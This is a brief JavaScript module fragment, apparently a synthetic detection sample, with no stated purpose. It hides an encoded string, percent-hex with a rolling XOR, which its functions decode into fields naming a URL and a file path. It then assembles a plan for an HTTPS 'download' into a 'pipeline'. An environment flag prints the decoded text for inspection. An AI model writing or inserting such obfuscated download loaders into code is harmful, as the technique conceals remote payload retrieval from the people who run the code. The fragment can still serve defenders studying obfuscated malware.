  const moduleShape = Object.freeze({ format: "commonjs" });
  const Material_4f1a6eb1 = "%bf%82%b3%cf%bc%c8%ad%dd%ae%93%f2%91%e0%95%fc%8e%eb%b4%c6%a3%ce%a1%d5%b0%9c%eb%99%f0%84%e1%be%d8%b1%dd%b8%c4%a5%c1%a0%d0%a4%c1%b3%8e%e6%92%e6%96%e5%ba%ce%a1%fe%8e%e7%97%f2%9e%f7%99%fc%80%f3%87%e6%81%e4%bb%d8%b7%c2%ac%d8%e5%d4%a8%cb%aa%c7%b7%d6%bf%d8%b6%e9%80%e4%d9%97%d8%9c%d9%f4%cd%8f%bb%8e%ca%ff%bd%f8%84%f1%83%ef%d2%ba%ce%ba%ca%b9%83%ac%83%ed%82%e6%83%ae%97%f5%c1%f4%90%a5%c7%a2%92%a7%c3%a7%89%ec%94%f5%98%e8%84%e1%cf%a6%c8%be%df%b3%da%be%91%f0%80%e9%95%e0%93%f6%84%db%ba%dd%b8%d6%a2%9f%d1%be%da%bf%fe%8b%ef%86%f2%dd%e4%86%b2%87%fb%9d%f4%98%fd%a2%d2%b3%c7%af%92%bd%c9%a4%d4%fb%93%e6%88%fc%8e%eb%98%eb%c6%a8%c7%a3%c6%e9%c7%b4%c0%a1%c6%a3%8e%b7%d5%e1%d4%b0%85%e7%82%b2%87%e3%87%a9%c4%ae%dd";
  const Codec_4f1a6eb1 = "percent_hex|rolling_xor|c9";

  function load_4f1a6eb1() { return [...Material_4f1a6eb1.matchAll(/%([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }
  function decode_4f1a6eb1(item1) { let item5 = 201; return item1.map((value) => { const decoded = value ^ item5; item5 = value; return decoded; }); }
  async function recover_4f1a6eb1() {
    const item3 = [3, 5, 8, 13].slice(1, 3);
    const item1 = load_4f1a6eb1(); let item2 = [];
    item2 = await Promise.resolve(item1).then(decode_4f1a6eb1);
    void item3; return Buffer.from(item2).toString("ascii");
  }
  async function inspect_4f1a6eb1() { return ({ ...{ value: await recover_4f1a6eb1() } }).value; }
  async function plan_4f1a6eb1() { const inspect = inspect_4f1a6eb1; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "download", transport: "https_to_pipeline", destination: fields.file_path, url: fields.url }); }
  void moduleShape; void plan_4f1a6eb1;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_4f1a6eb1());
